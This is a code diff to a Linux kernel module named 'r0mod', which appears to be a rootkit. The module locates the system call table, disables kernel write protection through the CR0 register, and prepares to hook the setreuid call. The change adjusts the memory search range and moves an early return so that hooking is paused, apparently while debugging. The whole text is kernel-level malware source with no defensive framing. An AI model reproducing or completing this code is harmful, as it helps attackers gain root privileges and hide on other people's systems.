@@ -9,8 +9,8 @@
 
 #include <r0mod/global.h>
 
-#define SEARCH_START    PAGE_OFFSET
-#define SEARCH_END      PAGE_OFFSET + 0x3fffffff //0xffffffff
+#define SEARCH_START    PAGE_OFFSET - 0x00000000
+#define SEARCH_END      PAGE_OFFSET //+ 0x01000000//0x4fffffff //0xffffffff
 
 unsigned long *syscall_table;
 
@@ -54,15 +54,14 @@ static int __init r0mod_init(void)
     printk("Search End:   %lx\n", SEARCH_END);
 
     syscall_table = find_sys_call_table();
-    return 0;
-    if(syscall_table == NULL)
+    if(!syscall_table)
     {
         printk("syscall_table == NULL\n");
         return 0;
     }
 
     printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);
-
+    return 0;
     write_cr0(read_cr0() & (~0x10000));
 
     orig_setreuid = (void *)syscall_table[__NR_setreuid];
@@ -78,7 +77,7 @@ static void __exit r0mod_exit(void)
 {
     printk("Module ending...\n");
 
-    if(syscall_table != NULL)
+    if(syscall_table)
     {
         write_cr0(read_cr0() & (~0x10000));
 
